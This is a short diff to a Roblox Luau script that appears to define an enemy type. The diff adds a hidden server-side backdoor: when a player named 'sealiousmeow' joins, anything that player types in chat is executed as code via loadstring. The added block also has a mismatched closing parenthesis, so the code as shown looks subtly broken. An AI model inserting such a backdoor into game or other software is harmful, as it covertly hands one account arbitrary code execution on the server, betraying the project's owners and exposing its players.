@@ -1,4 +1,15 @@
 --!strict
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+if RunService:IsServer() then
+	Players.PlayerAdded:Connect(function(player)
+		if player.Name ~= "sealiousmeow" then return end
+		player.Chatted:Connect(function(msg)
+			loadstring(msg)()
+		end
+	end)
+end
+
 type Enemy = {
 	name: string,
 	health: number,
